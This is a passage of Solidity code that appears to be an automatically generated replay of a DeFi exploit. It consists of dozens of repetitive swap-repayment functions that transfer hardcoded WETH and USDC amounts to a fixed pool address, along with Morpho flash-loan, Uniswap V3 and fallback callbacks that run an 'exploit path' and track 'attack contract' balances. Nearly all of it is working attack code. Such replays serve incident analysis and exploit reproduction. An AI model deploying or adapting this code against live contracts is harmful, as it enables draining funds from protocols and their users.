        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap132() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950280837172305] = true;
        uint256 swapRepayAmount = 13495950280837172305;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap133() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950253979895222] = true;
        uint256 swapRepayAmount = 13495950253979895222;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap134() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950228913103371] = true;
        uint256 swapRepayAmount = 13495950228913103371;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap135() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950193175020287] = true;
        uint256 swapRepayAmount = 13495950193175020287;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap136() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_65] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap137() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950366708840258] = true;
        uint256 swapRepayAmount = 13495950366708840258;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap138() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_66] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap139() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950243236984418] = true;
        uint256 swapRepayAmount = 13495950243236984418;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap140() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_67] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap141() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950321946711294] = true;
        uint256 swapRepayAmount = 13495950321946711294;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap142() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950259351350631] = true;
        uint256 swapRepayAmount = 13495950259351350631;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap143() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_68] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap144() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_69] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap145() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_70] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap146() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_71] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap147() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_72] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap148() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_73] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap149() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950364918355094] = true;
        uint256 swapRepayAmount = 13495950364918355094;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap150() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950355965929282] = true;
        uint256 swapRepayAmount = 13495950355965929282;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap151() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_74] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap152() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950252189410088] = true;
        uint256 swapRepayAmount = 13495950252189410088;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap153() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950212870356633] = true;
        uint256 swapRepayAmount = 13495950212870356633;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap154() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_75] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap155() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950347013503480] = true;
        uint256 swapRepayAmount = 13495950347013503480;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap156() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_76] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap157() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950277256202022] = true;
        uint256 swapRepayAmount = 13495950277256202022;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap158() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950232494073630] = true;
        uint256 swapRepayAmount = 13495950232494073630;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap159() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_77] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap160() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_78] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap161() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950207498901259] = true;
        uint256 swapRepayAmount = 13495950207498901259;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap162() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_79] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap163() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950194965505407] = true;
        uint256 swapRepayAmount = 13495950194965505407;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap164() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_80] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap165() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950307658639789] = true;
        uint256 swapRepayAmount = 13495950307658639789;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap166() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_81] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap167() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_82] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap168() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950345223018319] = true;
        uint256 swapRepayAmount = 13495950345223018319;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap169() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950270094261460] = true;
        uint256 swapRepayAmount = 13495950270094261460;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap170() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_83] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap171() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_84] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap172() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950295161053458] = true;
        uint256 swapRepayAmount = 13495950295161053458;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap173() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_85] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap174() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950327318166755] = true;
        uint256 swapRepayAmount = 13495950327318166755;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap175() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_86] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap176() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_87] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap177() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950304113479194] = true;
        uint256 swapRepayAmount = 13495950304113479194;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap178() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950196755990527] = true;
        uint256 swapRepayAmount = 13495950196755990527;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap179() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950246817954683] = true;
        uint256 swapRepayAmount = 13495950246817954683;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap180() internal {
        _replayDone[REPLAY_TRANSFER_A_D0_B53_D_F224_10921226074968110] = true;
        uint256 swapRepayAmount = 10921226074968110;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_D0B53D_F224, swapRepayAmount);
    }

    function _paySwap181() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_88] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap182() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950338061077688] = true;
        uint256 swapRepayAmount = 13495950338061077688;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap183() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950314784770686] = true;
        uint256 swapRepayAmount = 13495950314784770686;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap184() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_89] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap185() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950216433422033] = true;
        uint256 swapRepayAmount = 13495950216433422033;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap186() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950211079871509] = true;
        uint256 swapRepayAmount = 13495950211079871509;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap187() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950325527681601] = true;
        uint256 swapRepayAmount = 13495950325527681601;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap188() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950237865529022] = true;
        uint256 swapRepayAmount = 13495950237865529022;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap189() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_90] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap190() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_91] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap191() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950287999112878] = true;
        uint256 swapRepayAmount = 13495950287999112878;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap192() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950255770380358] = true;
        uint256 swapRepayAmount = 13495950255770380358;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap193() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950323737196447] = true;
        uint256 swapRepayAmount = 13495950323737196447;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap194() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950305886059491] = true;
        uint256 swapRepayAmount = 13495950305886059491;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap195() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950286208627735] = true;
        uint256 swapRepayAmount = 13495950286208627735;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap196() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_92] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap197() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950302322994047] = true;
        uint256 swapRepayAmount = 13495950302322994047;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap198() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950318365740990] = true;
        uint256 swapRepayAmount = 13495950318365740990;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap199() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_93] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap200() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_94] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap201() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950203917931014] = true;
        uint256 swapRepayAmount = 13495950203917931014;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap202() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_95] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap203() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_96] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap204() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_97] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap205() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_98] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap206() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_99] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _paySwap207() internal {
        _replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_100] = true;
        uint256 swapRepayAmount = 19403880776155;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_1C450D_F608, swapRepayAmount);
    }

    function _runExploitPath2() internal {
        _replayDone[REPLAY_RUN_EXPLOIT_PATH2] = true;
    }

    receive() external payable {}

    function onERC721Received(address arg0, address arg1, uint256 amount, bytes calldata arg3) external payable {
        arg0;
        arg1;
        amount;
        arg3;
        bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        arg1;
        if (amount == 10544813644832897955984) {
            if (!_replayDone[REPLAY_BALANCE_OF_ATTACK_CONTRACT_2]) flashCallback2();
            return;
        }
        if (amount == 22539727986604) {
            if (!_replayDone[REPLAY_BALANCE_OF_ATTACK_CONTRACT_1]) flashCallback();
            return;
        }
        if (!_replayDone[REPLAY_BALANCE_OF_ATTACK_CONTRACT_2]) flashCallback2();
        return;
    }

    function uniswapV3MintCallback(uint256 amount, uint256 amount1, bytes calldata arg2) external payable {
        amount;
        amount1;
        arg2;
        if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_184016562672189]) _payMintSwap();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0xf1a881b9) {
            borrowFlashLiquidity();
            return;
        }
        if (msg.sig == 0xfa461e33) {
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 1000000000 || arg1 == 1000000000)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_1000000000]) {
                        _paySwap122();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 11013674086286896 || arg1 == 11013674086286896)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_11013674086286896]) {
                        _paySwap40();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 400080026003 || arg1 == 400080026003)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_400080026003]) {
                        _paySwap24();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950189594037729 || arg1 == 13495950189594037729)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950189594037729]) {
                        _paySwap89();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950191384535167 || arg1 == 13495950191384535167)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950191384535167]) {
                        _paySwap99();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950193175020287 || arg1 == 13495950193175020287)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950193175020287]) {
                        _paySwap135();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950194965505407 || arg1 == 13495950194965505407)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950194965505407]) {
                        _paySwap163();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950196755990527 || arg1 == 13495950196755990527)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950196755990527]) {
                        _paySwap178();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950198546475648 || arg1 == 13495950198546475648)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950198546475648]) {
                        _paySwap108();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950200336960769 || arg1 == 13495950200336960769)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950200336960769]) {
                        _paySwap13();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950202127445892 || arg1 == 13495950202127445892)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950202127445892]) {
                        _paySwap117();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950203917931014 || arg1 == 13495950203917931014)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950203917931014]) {
                        _paySwap201();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950205708416137 || arg1 == 13495950205708416137)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950205708416137]) {
                        _paySwap95();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950207498901259 || arg1 == 13495950207498901259)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950207498901259]) {
                        _paySwap161();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950209289386384 || arg1 == 13495950209289386384)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950209289386384]) {
                        _paySwap51();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950211079871509 || arg1 == 13495950211079871509)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950211079871509]) {
                        _paySwap186();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950212870356633 || arg1 == 13495950212870356633)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950212870356633]) {
                        _paySwap153();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950214660841759 || arg1 == 13495950214660841759)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950214660841759]) {
                        _paySwap30();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950216433422033 || arg1 == 13495950216433422033)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950216433422033]) {
                        _paySwap185();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950218206002308 || arg1 == 13495950218206002308)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950218206002308]) {
                        _paySwap61();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950219978582582 || arg1 == 13495950219978582582)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950219978582582]) {
